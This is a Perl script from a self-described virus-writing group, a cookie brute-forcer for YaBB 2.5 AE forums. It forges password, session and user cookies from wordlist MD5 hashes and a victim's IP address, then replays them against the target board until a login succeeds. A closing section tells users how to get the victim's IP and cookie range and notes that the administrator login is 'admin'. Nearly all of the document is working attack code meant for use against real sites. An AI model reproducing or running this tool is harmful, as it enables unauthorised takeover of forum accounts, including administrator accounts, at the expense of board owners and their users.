#!/usr/bin/perl
# Cookiemonster - YaBB 2.5 AE cookie bruteforcer
# by Perforin - virii.lu - [VX]netw0rk

use warnings;
use strict;

use CGI;
use LWP::Simple;
use WWW::Curl::Easy;
use Digest::MD5 qw(md5_base64);

	
my ($url,$path,$lgn,$ip,$cookierange,$wordlist,$word);
my (@mycookies,$query,$cookie,$cookie1,$cookie2,$curl);
my ($securl,$response_body,$retcode,$response_code,$arg);

print <<'HEADER';
[!] Welcome to Cookiemonster!
[!] YaBB Cookie bruteforcer

[+] Coded by SpyEyE - Family [ WhoAmi ]

HEADER

$arg = shift || '';

print "[?] URL: ";
chomp($url = <STDIN>);
print "[?] Path: ";
chomp($path = <STDIN>);
print "[?] Loginname: ";
chomp($lgn = <STDIN>);
print "[?] IP of Victime: ";
chomp($ip = <STDIN>);
print "[?] Cookie Numbers: ";
chomp($cookierange = <STDIN>);
print "[?] Wordlist: ";
chomp($wordlist = <STDIN>);

$securl = $url;
$securl =~ s/^http:\/\///;

print "[-] Looks not like an URL...\n"	and exit unless $url =~ /^http:\/\//;
print "[-] We need the FULL path!\n"	and exit unless $path =~ /YaBB\.(pl|cgi)$/;
print "[-] We need a loginname!\n"		and exit unless $lgn =~ /\.*/;
print "[-] Thats no IP...\n" 			and exit unless $ip =~ /^\d*\.\d*\.\d*\.\d*$/;
print "[-] Malformed cookie numbers!\n" and exit unless $cookierange =~ /^\d*$/;
print "[-] Wordlist not found!\n" 		and exit unless -e $wordlist;

open WORDLIST, "<", $wordlist || die "[-] Strange error with wordlist!" if -e $wordlist;

print "\n[+] Bruting $url\n";

while (<WORDLIST>) {
chomp($_);

print "$_ => " .  md5_base64($_) . "\n" if $arg =~ /-v/i;

$query = new CGI;
$cookie = $query->cookie(-name => "Y2Pass-$cookierange",
			     -value => md5_base64($_),
			     -path => '/',
			     -domain => $securl);
$cookie1 = $query->cookie(-name => "Y2Sess-$cookierange",
			     -value => md5_base64($ip),
			     -path => '/',
			     -domain => $securl);
$cookie2 = $query->cookie(-name=> "Y2User-$cookierange",
			     -value => $lgn,
			     -path => '/',
			     -domain => $securl);
			     
@mycookies = ($cookie,$cookie1,$cookie2);

open COOKIES,">","cookiefile.txt";
print COOKIES $query->header(-cookie=> \@mycookies);
close COOKIES;

$curl = WWW::Curl::Easy->new;
        
$curl->setopt(CURLOPT_HEADER,1);
$curl->setopt(CURLOPT_URL, $url . $path);
$curl->setopt(CURLOPT_COOKIEFILE, "cookiefile.txt");

$curl->setopt(CURLOPT_WRITEDATA,\$response_body);
$retcode = $curl->perform;


	if (!$retcode) {
		$response_code = $curl->getinfo(CURLINFO_HTTP_CODE);

open LOG,">","LOGFILE.txt";
print LOG $response_body;
close LOG;

		print "\n[!] Login cracked!\n[!] Password: $_\n" and exit if ($response_body =~ /Good \w*/ig and $response_body =~ /\<br \/\>you have/ig);

	} else {
	
		print "\n[-] Host down!\n";
		exit;
	
	}

}

print "[-]Sry no login found!\n";

close WORDLIST;

=pod

This is a YaBB 2.5 AE cookie bruteforcer. It may work for lower versions
but I never tested it.

Cookiemonster does a bruteforce attack with faked cookies to gain access
to a YaBB board. But you need some informations from the victim and the
victims board.

First, you need the IP adress of your victim. Use your imagination on
how to get this information...
Second, you need the random cookie range from the victims board. So you
got to register yourself at his board, accept cookies and read the
numbers behind Y2Pass-, Y2Sess- and Y2User-.
Third, you need his loginname which is not the same as the name
display at the board. A little hint for you here: The administrators
loginname is always admin.


Oh yeah by the way, YaBB is written by monkeys on crack.


Greetings to: skier_ Metal- porezness Rayden ShaQ Cactus ROP_SLED and 
the rest of #vxnet and #virus

=cut
